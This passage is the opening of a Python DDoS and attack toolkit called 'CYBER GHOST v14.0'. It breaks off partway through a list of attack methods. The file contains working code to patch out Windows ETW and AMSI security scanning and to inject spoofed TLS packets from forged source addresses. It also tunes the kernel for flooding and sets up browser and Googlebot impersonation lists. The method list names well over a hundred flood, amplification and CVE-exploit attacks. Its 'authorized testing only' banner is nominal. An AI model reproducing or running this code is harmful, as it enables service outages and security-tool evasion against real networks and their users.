#بسم الله الرحمن الرحیم
#أَحَسِبَ النَّاسُ أَنْ يُتْرَكُوا أَنْ يَقُولُوا آمَنَّا وَهُمْ لَا يُفْتَنُونَ
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
================================================================================
 CYBER GHOST v14.0 — OMNIPOTENT SUPREME
 Full-Spectrum Adaptive Attack Engine | Absolute Maximum Capability
================================================================================
 Creator  : Cyber Ghost
 Telegram : @Cyber_Ghost_error_404
 Build    : 2026.04-SUPREME
================================================================================
 FOR AUTHORIZED SECURITY TESTING ONLY
 Unauthorized use is a CRIMINAL OFFENSE.
================================================================================
"""

import asyncio, aiohttp, random, socket, struct, sys, threading, time, ssl
import urllib.parse, os, json, base64, logging, ipaddress, itertools, uuid
import platform, subprocess, hashlib, hmac, zlib, gzip, ctypes, ctypes.util
import multiprocessing as mp, concurrent.futures, queue, re, string, statistics
import signal, atexit, traceback, codecs, binascii, secrets, math
from datetime import datetime, timedelta, timezone
from typing import List, Dict, Optional, Any, Tuple, Set, Callable, Iterable, Union
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import defaultdict, deque, OrderedDict, Counter
from contextlib import suppress, asynccontextmanager
from dataclasses import dataclass, field
from pathlib import Path
from enum import Enum
from urllib.parse import urlparse, urljoin, quote, unquote

try:
    from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, BackgroundTasks, UploadFile, File
    from fastapi.responses import HTMLResponse, JSONResponse
    from pydantic import BaseModel, field_validator
    import uvicorn
    HAS_WEB = True
except ImportError:
    HAS_WEB = False
    BaseModel = object
    def field_validator(*a, **kw):
        def deco(fn): return fn
        return deco

try:
    import uvloop
    uvloop.install()
    HAS_UVLOOP = True
except ImportError:
    HAS_UVLOOP = False

try: import psutil; HAS_PSUTIL = True
except ImportError: HAS_PSUTIL = False

try: import httpx; HAS_HTTPX = True
except ImportError: HAS_HTTPX = False

try: import websockets; HAS_WS = True
except ImportError: HAS_WS = False

try:
    import colorama; colorama.init(autoreset=True); HAS_COLORAMA = True
except ImportError: HAS_COLORAMA = False

try: import socks; HAS_PYSOCKS = True
except ImportError: HAS_PYSOCKS = False

try:
    from aiohttp_socks import ProxyConnector, ProxyType as SocksProxyType
    HAS_AIO_SOCKS = True
except ImportError: HAS_AIO_SOCKS = False

try:
    import h2.connection, h2.config, h2.events, h2.exceptions, h2.settings, h2.errors
    HAS_H2 = True
except ImportError: HAS_H2 = False

try:
    import hyperframe.frame; HAS_HYPERFRAME = True
except ImportError: HAS_HYPERFRAME = False

try:
    import aioquic
    from aioquic.asyncio import connect as quic_connect, QuicConnectionProtocol
    from aioquic.quic.configuration import QuicConfiguration
    from aioquic.quic.connection import QuicConnection
    from aioquic.quic.packet import QuicProtocolVersion
    from aioquic.h3.connection import H3Connection
    HAS_AIOQUIC = True
except ImportError:
    HAS_AIOQUIC = False
    QuicConnectionProtocol = object
    QuicConnection = None
    QuicConfiguration = None
    QuicProtocolVersion = None
    H3Connection = None
    quic_connect = None

try:
    from scapy.all import (IP, TCP, UDP, ICMP, Raw, send, sendp, Ether, sr1,
                           conf, DNS, DNSQR, DNSRR, get_if_list, get_if_hwaddr,
                           fragment as scapy_fragment)
    HAS_SCAPY = True
except ImportError: HAS_SCAPY = False

try:
    import dns.resolver; HAS_DNSPY = True
except ImportError: HAS_DNSPY = False

try:
    from curl_cffi import requests as curl_requests
    from curl_cffi import CurlOpt
    HAS_CURL_CFFI = True
except ImportError:
    HAS_CURL_CFFI = False
    CurlOpt = None
    curl_requests = None

try:
    import cloudscraper; HAS_CLOUDSCRAPER = True
except ImportError: HAS_CLOUDSCRAPER = False

try:
    import brotli; HAS_BROTLI = True
except ImportError: HAS_BROTLI = False

try:
    from browserforge.headers import HeaderGenerator
    from browserforge.fingerprints import FingerprintGenerator
    HAS_BROWSERFORGE = True
except ImportError:
    HAS_BROWSERFORGE = False
    HeaderGenerator = None
    FingerprintGenerator = None

try:
    import mmh3; HAS_MMH3 = True
except ImportError: HAS_MMH3 = False

try:
    import requests; HAS_REQUESTS = True
except ImportError: HAS_REQUESTS = False

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    HAS_URLLIB3 = True
except ImportError: HAS_URLLIB3 = False

# ============================================================================
#  META
# ============================================================================
CREATOR = "Cyber Ghost"
TELEGRAM = "@Cyber_Ghost_error_404"
CHANNEL = "@Cyber_Ghost_error_404"
VERSION = "14.0-SUPREME"
BUILD = "2026.04"

MAX_DURATION = 86400
DEFAULT_DURATION = 180
IS_WINDOWS = platform.system().lower() == "windows"
IS_LINUX = platform.system().lower() == "linux"
IS_MAC = platform.system().lower() == "darwin"
PLATFORM_NAME = ("Windows" if IS_WINDOWS else "Linux" if IS_LINUX
                 else "macOS" if IS_MAC else platform.system())

try: sys.setswitchinterval(0.001)
except Exception: pass

try:
    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    os.environ["PYTHONIOENCODING"] = "utf-8"
except Exception: pass


def _silent_unraisable(unraisable):
    try:
        exc_msg = str(unraisable.exc_value) if unraisable.exc_value else ""
        if any(p in exc_msg for p in (
            "peer-initiated", "Cannot send data", "unidirectional",
            "SSL connection is closed", "Connection reset",
            "Connection aborted", "Broken pipe", "Too many open files",
            "Operation not permitted", "Network is unreachable",
            "No route to host", "Host is down"
        )):
            return
    except Exception: pass
    try: sys.__unraisablehook__(unraisable)
    except Exception: pass

sys.unraisablehook = _silent_unraisable

LOG_DIR = Path("ghost_logs"); LOG_DIR.mkdir(exist_ok=True)
PROXY_DIR = Path("ghost_proxies"); PROXY_DIR.mkdir(exist_ok=True)
CACHE_DIR = Path("ghost_cache"); CACHE_DIR.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.WARNING,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler(LOG_DIR / "cyber_ghost.log", encoding="utf-8")]
)
logger = logging.getLogger("cyber_ghost")

for _name in ("curl_cffi", "urllib3", "aiohttp", "httpx", "asyncio", "h2",
              "aioquic", "websockets", "scapy", "uvicorn"):
    _lg = logging.getLogger(_name)
    _lg.setLevel(logging.CRITICAL)

# ============================================================================
#  SYSTEM TUNING
# ============================================================================
def tune_system():
    if not IS_LINUX: return
    tunes = [
        ("net.core.wmem_max", "268435456"), ("net.core.rmem_max", "268435456"),
        ("net.core.wmem_default", "33554432"), ("net.core.rmem_default", "33554432"),
        ("net.core.netdev_max_backlog", "500000"), ("net.core.somaxconn", "131072"),
        ("net.core.optmem_max", "50331648"),
        ("net.ipv4.tcp_mem", "786432 1048576 53554432"),
        ("net.ipv4.tcp_wmem", "4096 131072 33554432"),
        ("net.ipv4.tcp_rmem", "4096 131072 33554432"),
        ("net.ipv4.tcp_fin_timeout", "5"), ("net.ipv4.tcp_tw_reuse", "1"),
        ("net.ipv4.ip_local_port_range", "1024 65535"),
        ("net.ipv4.tcp_max_syn_backlog", "131072"),
        ("net.ipv4.tcp_max_tw_buckets", "2000000"),
        ("net.ipv4.tcp_timestamps", "0"), ("net.ipv4.tcp_sack", "1"),
        ("net.ipv4.tcp_window_scaling", "1"), ("net.ipv4.tcp_fastopen", "3"),
        ("net.ipv4.tcp_syncookies", "1"), ("net.ipv4.tcp_no_metrics_save", "1"),
        ("net.ipv4.tcp_mtu_probing", "1"), ("net.ipv4.tcp_notsent_lowat", "16384"),
        ("net.ipv4.tcp_slow_start_after_idle", "0"),
        ("net.ipv4.tcp_low_latency", "1"),
        ("net.ipv4.tcp_abort_on_overflow", "1"),
        ("net.ipv4.ipfrag_high_thresh", "268435456"),
        ("net.ipv4.ipfrag_low_thresh", "201326592"),
        ("net.ipv4.ipfrag_time", "15"),
        ("net.ipv4.tcp_moderate_rcvbuf", "1"),
        ("net.ipv6.conf.all.disable_ipv6", "0"),
        ("net.ipv4.conf.all.rp_filter", "0"),
        ("net.ipv4.conf.default.rp_filter", "0"),
        ("net.ipv4.conf.all.accept_local", "1"),
        ("net.ipv4.conf.all.route_localnet", "1"),
        ("net.ipv4.ip_forward", "1"),
        ("net.ipv4.conf.all.forwarding", "1"),
        ("kernel.panic", "10"),
        ("kernel.panic_on_oops", "1"),
        ("fs.file-max", "2097152"),
        ("net.ipv4.tcp_max_orphans", "65536"),
        ("net.ipv4.tcp_rfc1337", "1"),
    ]
    for key, val in tunes:
        with suppress(Exception):
            subprocess.run(["sysctl", "-w", f"{key}={val}"], check=False, timeout=2,
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    with suppress(Exception):
        import resource
        resource.setrlimit(resource.RLIMIT_NOFILE, (1048576, 1048576))

try:
    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    HAS_LIBC = True
except Exception:
    libc = None
    HAS_LIBC = False

class iovec(ctypes.Structure):
    _fields_ = [("iov_base", ctypes.c_void_p), ("iov_len", ctypes.c_size_t)]

class mmsghdr(ctypes.Structure):
    _fields_ = [("msg_hdr", ctypes.c_void_p), ("msg_len", ctypes.c_uint)]

def sendmmsg_raw(fd: int, packets: List[bytes], target: Tuple[str, int]) -> int:
    if not HAS_LIBC or not IS_LINUX: return 0
    n = len(packets)
    if n == 0: return 0
    sockaddr_buf = struct.pack("!HH", socket.AF_INET, target[1] & 0xffff) + \
                   socket.inet_aton(target[0]) + b"\x00" * 8
    sa_buf = ctypes.create_string_buffer(sockaddr_buf)
    sa_ptr = ctypes.cast(sa_buf, ctypes.c_void_p)
    sa_len = len(sockaddr_buf)
    msgs = (mmsghdr * n)()
    iovs = (iovec * n)()
    bufs = [sa_buf]
    for i, pkt in enumerate(packets):
        buf = ctypes.create_string_buffer(pkt, len(pkt))
        bufs.append(buf)
        iovs[i].iov_base = ctypes.cast(buf, ctypes.c_void_p)
        iovs[i].iov_len = len(pkt)
        mh = struct.pack("!P I P I I", ctypes.addressof(iovs[i]), 1, sa_ptr.value, sa_len, 0)
        mh_buf = ctypes.create_string_buffer(mh, len(mh))
        bufs.append(mh_buf)
        msgs[i].msg_hdr = ctypes.cast(mh_buf, ctypes.c_void_p)
        msgs[i].msg_len = 0
    try:
        sent = libc.sendmmsg(ctypes.c_int(fd), ctypes.byref(msgs),
                             ctypes.c_uint(n), ctypes.c_int(0))
        return sent if sent > 0 else 0
    except Exception:
        return 0

# ============================================================================
#  THREAD-SAFE PRNG
# ============================================================================
class XorShift:
    __slots__ = ('state',)
    def __init__(self, seed=None):
        self.state = (seed or int(time.time() * 1e6) ^ id(self)) & 0xffffffff or 1
    def next(self):
        x = self.state
        x ^= (x << 13) & 0xffffffff
        x ^= (x >> 17)
        x ^= (x << 5) & 0xffffffff
        self.state = x & 0xffffffff
        return self.state
    def port(self): return 1024 + (self.next() % 64512)
    def rand8(self): return self.next() & 0xff

_global_rand = XorShift()
_tls = threading.local()

def _rand():
    r = getattr(_tls, 'rand', None)
    if r is None:
        r = XorShift(secrets.randbits(32))
        _tls.rand = r
    return r

# ============================================================================
#  LOCK-FREE STATS
# ============================================================================
class LockFreeStats:
    def __init__(self, n_slots: int = 512):
        self.n = n_slots
        self.sent = [0] * n_slots
        self.failed = [0] * n_slots
        self.bytes_sent = [0] * n_slots
        self.slot = threading.local()
    def _slot(self) -> int:
        s = getattr(self.slot, 'idx', None)
        if s is None:
            s = secrets.randbelow(self.n)
            self.slot.idx = s
        return s
    def add_sent(self, n=1, b=0):
        i = self._slot(); self.sent[i] += n; self.bytes_sent[i] += b
    def add_failed(self):
        i = self._slot(); self.failed[i] += 1
    def total(self) -> Tuple[int, int, int]:
        return sum(self.sent), sum(self.failed), sum(self.bytes_sent)
    def reset(self):
        for i in range(self.n):
            self.sent[i] = 0; self.failed[i] = 0; self.bytes_sent[i] = 0

# ============================================================================
#  RESOURCE GATE
# ============================================================================
class ResourceGate:
    def __init__(self):
        self.scale = 1.0
        self._stop = False
        self._th = None
        self._paused = False
        self._reason = ""
        self._cpu_pct = 0.0
        self._ram_pct = 0.0
        self._ram_avail_gb = 0.0
        self._net_mbps = 0.0
        self._prev_net = None
        self._prev_time = None
        self._lock = threading.Lock()

    def start(self):
        if not HAS_PSUTIL: return
        if self._th and self._th.is_alive(): return
        self._stop = False
        self._th = threading.Thread(target=self._loop, daemon=True, name="resgate")
        self._th.start()

    def stop(self):
        self._stop = True
        if self._th: self._th.join(timeout=1)

    def _loop(self):
        try:
            psutil.cpu_percent(interval=None); time.sleep(0.5)
        except Exception: pass
        try:
            self._prev_net = psutil.net_io_counters()
            self._prev_time = time.monotonic()
        except Exception: pass
        while not self._stop:
            try:
                cpu = psutil.cpu_percent(interval=None)
                ram = psutil.virtual_memory()
                ram_pct = ram.percent
                ram_avail = ram.available / (1024 ** 3)
                la = os.getloadavg()[0] if hasattr(os, 'getloadavg') else 0.0
                net_mbps = 0.0
                try:
                    net = psutil.net_io_counters()
                    if self._prev_net:
                        dt = max(0.001, time.monotonic() - self._prev_time)
                        net_mbps = (net.bytes_sent - self._prev_net.bytes_sent) * 8 / dt / 1e6
                    self._prev_net = net
                    self._prev_time = time.monotonic()
                except Exception: pass
                s = 1.0
                if cpu > 95: s *= 0.20
                elif cpu > 90: s *= 0.40
                elif cpu > 80: s *= 0.60
                elif cpu > 65: s *= 0.85
                if ram_pct > 95: s *= 0.25
                elif ram_pct > 88: s *= 0.50
                elif ram_pct > 78: s *= 0.75
                if la > (mp.cpu_count() * 3.0): s *= 0.50
                elif la > (mp.cpu_count() * 2.0): s *= 0.70
                if cpu < 25 and ram_pct < 55: s = min(3.0, s * 1.6)
                elif cpu < 40 and ram_pct < 65: s = min(2.5, s * 1.3)
                with self._lock:
                    self.scale = max(0.05, min(3.0, s))
                    self._cpu_pct = cpu
                    self._ram_pct = ram_pct
                    self._ram_avail_gb = ram_avail
                    self._net_mbps = net_mbps
                    if ram_pct > 95 or cpu > 97:
                        self._paused = True
                        self._reason = f"RAM={ram_pct:.0f}% CPU={cpu:.0f}%"
                    elif ram_pct < 80 and cpu < 85:
                        self._paused = False
                        self._reason = ""
            except Exception:
                with self._lock: self.scale = 1.0
            time.sleep(1.0)

    def get(self) -> float:
        with self._lock: return self.scale
    def is_paused(self) -> bool:
        with self._lock: return self._paused
    def reason(self) -> str:
        with self._lock: return self._reason
    def snapshot(self) -> Dict[str, Any]:
        with self._lock:
            return {"scale": self.scale, "cpu": self._cpu_pct, "ram": self._ram_pct,
                    "ram_avail_gb": self._ram_avail_gb, "net_mbps": self._net_mbps,
                    "paused": self._paused, "reason": self._reason}

resource_gate = ResourceGate()

# ============================================================================
#  OBFUSCATION & EVASION
# ============================================================================
class ETWPatcher:
    @staticmethod
    def patch():
        if not IS_WINDOWS: return False
        try:
            k = ctypes.windll.kernel32
            n = ctypes.windll.ntdll
            etw = ctypes.cast(k.GetProcAddress(n._handle, b"EtwEventWrite"), ctypes.c_void_p)
            if not etw: return False
            old = ctypes.c_ulong()
            k.VirtualProtect(etw, 1, 0x40, ctypes.byref(old))
            ctypes.memmove(etw, b"\xc3", 1)
            k.VirtualProtect(etw, 1, old, ctypes.byref(old))
            return True
        except Exception:
            return False

class AMSIBypass:
    @staticmethod
    def patch():
        if not IS_WINDOWS: return False
        try:
            k = ctypes.windll.kernel32
            amsi = ctypes.windll.LoadLibrary("amsi.dll")
            ab = ctypes.cast(k.GetProcAddress(amsi._handle, b"AmsiScanBuffer"), ctypes.c_void_p)
            if not ab: return False
            old = ctypes.c_ulong()
            k.VirtualProtect(ab, 1, 0x40, ctypes.byref(old))
            ctypes.memmove(ab, b"\xc3", 1)
            k.VirtualProtect(ab, 1, old, ctypes.byref(old))
            return True
        except Exception:
            return False

class APIHasher:
    @staticmethod
    def djb2(s):
        h = 5381
        for c in s.encode(): h = ((h << 5) + h) + c
        return h & 0xFFFFFFFF
    @staticmethod
    def fnv1a(s):
        h = 0x811c9dc5
        for c in s.encode():
            h ^= c
            h = (h * 0x01000193) & 0xFFFFFFFF
        return h

# ============================================================================
#  SNI SPOOFER
# ============================================================================
class SNISpoofer:
    @staticmethod
    def build_fake_client_hello(sni_host):
        try:
            sni_bytes = sni_host.encode()
            hello = (
                b"\x16\x03\x01" + struct.pack(">H", 0) + b"\x01" + b"\x00\x00\x00" +
                b"\x03\x03" + os.urandom(32) + b"\x00" + b"\x00\x02\x00\x2f" + b"\x01\x00" +
                struct.pack(">H", 5 + len(sni_bytes)) + b"\x00\x00" +
                struct.pack(">H", 5 + len(sni_bytes)) +
                struct.pack(">H", 3 + len(sni_bytes)) + b"\x00" +
                struct.pack(">H", len(sni_bytes)) + sni_bytes
            )
            hello = hello[:3] + struct.pack(">H", len(hello) - 5) + hello[5:]
            hello = hello[:6] + struct.pack(">I", len(hello) - 9)[1:] + hello[9:]
            return hello
        except Exception:
            return None
    @staticmethod
    def inject(sni_host, dst_ip, dst_port):
        if not HAS_SCAPY: return False
        try:
            fake_hello = SNISpoofer.build_fake_client_hello(sni_host)
            if not fake_hello: return False
            src_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            ip = IP(src=src_ip, dst=dst_ip, ttl=random.randint(1, 3))
            tcp = TCP(sport=random.randint(1024, 65535), dport=dst_port,
                      seq=random.randint(0, 2**32 - 1), flags="PA")
            send(ip / tcp / Raw(fake_hello), verbose=False)
            return True
        except Exception:
            return False

# ============================================================================
#  IDENTITY DATA
# ============================================================================
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.html)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 OPR/117.0.0.0",
]

REFERERS = [
    "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
    "https://www.facebook.com/", "https://twitter.com/", "https://www.reddit.com/",
    "https://www.youtube.com/", "https://t.me/", "https://www.instagram.com/",
    "https://www.linkedin.com/", "https://www.pinterest.com/", "https://www.tumblr.com/",
    "https://news.ycombinator.com/", "https://stackoverflow.com/", "https://github.com/",
    "https://www.cloudflare.com/", "https://www.wikipedia.org/",
]

ACCEPT_LANGS = [
    "en-US,en;q=0.9", "en-GB,en;q=0.9", "fa-IR,fa;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8", "ru-RU,ru;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8", "ar-SA,ar;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8", "ko-KR,ko;q=0.9,en;q=0.8",
]

ENCODINGS = ["gzip, deflate, br, zstd", "gzip, deflate, br", "gzip, deflate", "br, gzip"]

CURL_IMPERSONATE = [
    "chrome136", "chrome133a", "chrome124", "chrome123", "chrome120",
    "safari260", "safari184", "safari180", "firefox147", "firefox144",
    "edge101", "edge99",
]

GOOGLEBOT_AGENTS = [
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
]

COOKIE_NAMES = [
    "PHPSESSID", "session_id", "JSESSIONID", "csrftoken", "_ga", "cf_clearance",
    "ASP.NET_SessionId", "laravel_session", "XSRF-TOKEN", "wordpress_logged_in",
    "wp-settings-1", "session", "sid", "auth", "token", "jwt", "access_token",
    "_gid", "_gat", "__cfduid", "_fbp", "_hjid",
]

# ============================================================================
#  METHOD LIST
# ============================================================================
METHODS: List[Tuple[str, str]] = [
    ("INFINITY_MIX", "🌌"),
    ("HTTP2_RAPID_RESET", "⚡"), ("HTTP2_CONTINUATION_FLOOD", "🌊"),
    ("HTTP2_PING_FLOOD", "🏓"), ("HTTP2_SETTINGS_FLOOD", "⚙️"),
    ("HTTP2_WINDOW_UPDATE_FLOOD", "🪟"), ("HTTP2_HPACK_BOMB", "💣"),
    ("HTTP2_STREAM_MULTIPLEX", "🔀"), ("HTTP2_PRIORITY_FLOOD", "🎯"),
    ("HTTP2_GOAWAY_FLOOD", "🚪"), ("HTTP2_PUSH_PROMISE_FLOOD", "📮"),
    ("HTTP2_RST_STREAM_SPAM", "🛑"), ("HTTP2_MADE_YOU_RESET", "🔁"),
    ("HTTP2_SPCA", "🧬"), ("HTTP2_BOMB", "💥"),
    ("HTTP2_SMUGGLING", "🕵️"), ("HTTP2_GRPC_CHURN", "⚙️"),
    ("HTTP2_PADDING_FLOOD", "🛋️"), ("HTTP2_DATA_PADDING", "📦"),
    ("HTTP2_WINDOW_ZERO", "0️⃣"), ("HTTP2_STREAM_EXHAUST", "🕳️"),
    ("HTTP2_HEADERS_SPLIT", "✂️"),
    ("HTTP3_QUIC_FLOOD", "🚀"), ("HTTP3_QUIC_HANDSHAKE_FLOOD", "🤝"),
    ("HTTP3_QUIC_VERSION_NEG", "🔢"), ("HTTP3_QPACK_EXPANSION", "💣"),
    ("HTTP3_SMUGGLING", "🕵️"), ("HTTP3_CACHE_POISONING", "☠️"),
    ("HTTP3_CDN_TSUNAMI", "🌊"), ("HTTP3_QUICLORIS", "🐢"),
    ("HTTP3_RETRY_LOOP", "🔄"), ("HTTP3_0RTT_FLOOD", "0️⃣"),
    ("HTTP3_CONNECTION_CLOSE_FLOOD", "🔚"), ("HTTP3_STREAM_RESET_FLOOD", "🔄"),
    ("HTTP3_QPACK_ENCODER_STALL", "🧱"),
    ("TLS_CLIENT_HELLO_FLOOD", "👋"), ("TLS_RENEGOTIATION", "🔁"),
    ("TLS_JA3_RANDOMIZED", "🎭"), ("TLS_JA4_RANDOMIZED", "🎭"),
    ("SNI_FLOOD", "🎭"), ("SNI_SPOOF", "🕵️"),
    ("TLS_HEARTBLEED_PROBE", "💔"), ("TLS_SESSION_RESUMPTION_FLOOD", "♻️"),
    ("TLS_CERTIFICATE_BOMB", "📜"), ("TLS_PSK_FLOOD", "🔑"),
    ("TLS_KEYSHARE_FLOOD", "🔐"), ("TLS_ECH_FLOOD", "🕶️"),
    ("TLS_0RTT_FLOOD", "0️⃣"),
    ("SYN_FLOOD_V2", "🔥"), ("UDP_FLOOD_V2", "💀"), ("ICMP_FLOOD_V2", "⚡"),
    ("TCP_FLOOD", "🌀"), ("ACK_FLOOD", "📨"), ("RST_FLOOD", "🛑"),
    ("FIN_FLOOD", "🏁"), ("XMAS_FLOOD", "🎄"), ("NULL_FLOOD", "⬛"),
    ("PSH_FLOOD", "📤"), ("URG_FLOOD", "🚨"), ("SYN_ACK_FLOOD", "🤝"),
    ("GRE_FLOOD", "🔀"), ("ESP_FLOOD", "🔐"), ("IPIP_FLOOD", "🎁"),
    ("FRAG_FLOOD", "🧩"), ("LAND_ATTACK", "🏠"), ("SMURF_ATTACK", "💥"),
    ("FRAGGLE_ATTACK", "💧"), ("TCP_OPTIONS_FLOOD", "🎛️"),
    ("TCP_MSS_FLOOD", "📏"), ("IP_OPTIONS_FLOOD", "🧬"),
    ("JUMBO_FRAME_FLOOD", "🐘"), ("IPSPOOF_SYN", "🎭"),
    ("TCP_TIMESTAMP_SPOOF", "⏰"), ("MAC_SPOOF", "🔗"),
    ("PQC_QUIC_INITIAL", "🔮"), ("ICMP_FRAGMENT_FLOOD", "🧩"),
    ("TCP_URGENT_DATA", "🚨"), ("TCP_ZERO_WINDOW", "0️⃣"),
    ("TCP_SACK_ABUSE", "🎁"), ("TCP_FASTOPEN_FLOOD", "🚀"),
    ("SCTP_INIT_FLOOD", "📡"), ("IPV6_RAW_FLOOD", "6️⃣"),
    ("SLOWLORIS_V2", "🐢"), ("SLOW_READ_V2", "📖"),
    ("RUDY_V2", "💧"), ("APACHE_KILLER_V2", "🪓"),
    ("SLOW_HEADERS", "🐌"), ("SLOW_BODY", "🐛"), ("SLOW_POST", "📬"),
    ("RANGE_HEADER_BOMB", "💥"), ("RANGE_AMP", "📡"),
    ("CACHE_BYPASS", "🗝️"), ("CACHE_POISONING", "☠️"),
    ("CF_BYPASS", "☁️"), ("HTTP_SMUGGLING_CLTE", "🕵️"),
    ("HTTP_SMUGGLING_TECL", "🕵️‍♂️"), ("HTTP_SMUGGLING_TE_TE", "🕵️"),
    ("HOST_HEADER_INJECTION", "🎯"), ("REQUEST_SMUGGLING_CHUNK", "🧱"),
    ("WEBSOCKET_FRAME_FLOOD", "🔌"), ("WEBSOCKET_PING_FLOOD", "🏓"),
    ("WEBSOCKET_DEFLATE_BOMB", "💣"), ("WEBSOCKET_MASK_FLOOD", "🎭"),
    ("WEBSOCKET_ZIP_BOMB", "🗜️"),
    ("GRAPHQL_DEPTH_BOMB", "📊"), ("GRAPHQL_ALIAS_BOMB", "🎭"),
    ("GRAPHQL_INTROSPECTION_FLOOD", "🔍"), ("GRPC_STREAM_FLOOD", "⚙️"),
    ("GRPC_WEB_TEXT_BOMB", "🌐"),
    ("JSON_BOMB", "💣"), ("XML_BOMB", "💥"), ("REGEX_DOS_REDOS", "🔴"),
    ("PROTOBUF_BOMB", "🧱"), ("BROTLI_BOMB", "🗜️"),
    ("DNS_AMP", "📡"), ("DNS_QUERY_FLOOD", "❓"), ("DNS_EDNS0", "📡"),
    ("DNS_DOH_SPOOF", "🕵️"),
    ("NTP_MONLIST", "🕐"), ("MEMCACHED_AMP", "💾"),
    ("SSDP_AMP", "🔌"), ("CLDAP_AMP", "📂"), ("LDAP_AMP", "🔍"),
    ("SNMP_AMP", "📊"), ("NETBIOS_AMP", "🪟"), ("MDNS_AMP", "🖥️"),
    ("WSD_AMP", "🔎"), ("RIPV1_AMP", "🛣️"), ("QOTD_AMP", "📜"),
    ("CHARGEN_AMP", "⚡"), ("STUN_AMP", "🌐"), ("DTLS_AMP", "🔒"),
    ("COAP_AMP", "🌊"), ("TFTP_AMP", "📦"), ("SLP_AMP", "📢"),
    ("PORTMAP_AMP", "🗺️"), ("TCP_AMP", "🔥"),
    ("REDIS_FLOOD", "🔴"), ("MONGO_FLOOD", "🍃"), ("ELASTIC_BOMB", "🔍"),
    ("MQTT_FLOOD", "📬"), ("MQTT5_AUTH_FLOOD", "🔐"),
    ("AMQP_FLOOD", "🐰"), ("RDP_FLOOD", "🖥️"),
    ("VNC_FLOOD", "🖼️"), ("SMB_FLOOD", "🗂️"), ("SMTP_FLOOD", "✉️"),
    ("IMAP_FLOOD", "📧"), ("POP3_FLOOD", "📬"), ("FTP_FLOOD", "📁"),
    ("TELNET_FLOOD", "📞"), ("SSH_FLOOD", "🔑"), ("SIP_FLOOD", "📞"),
    ("RTSP_FLOOD", "🎥"), ("NFS_FLOOD", "🗺️"), ("KERBEROS_FLOOD", "🎫"),
    ("ARD_FLOOD", "🍎"),
    ("MINECRAFT", "⛏️"), ("MINECRAFT_BOT", "🤖"), ("FIVEM", "🚗"),
    ("FIVEM_TOKEN", "🎫"), ("TEAMSPEAK", "🎧"), ("STEAM_QUERY", "🎮"),
    ("VSE_QUERY", "🎮"), ("SAMP_QUERY", "🔫"), ("CSGO_QUERY", "🔫"),
    ("QUAKE_QUERY", "🎯"), ("BITTORRENT_DHT", "🌊"), ("KAD_ATTACK", "🌐"),
    ("EMULE_FLOOD", "🐴"), ("GNUTELLA_FLOOD", "🌐"), ("MCPE", "📱"),
    ("CVE_2021_41773", "🐛"), ("CVE_2024_4577", "🐛"),
    ("CVE_2024_23897", "🐛"), ("CVE_2025_24813", "🐛"),
    ("CVE_2025_29927", "🐛"),
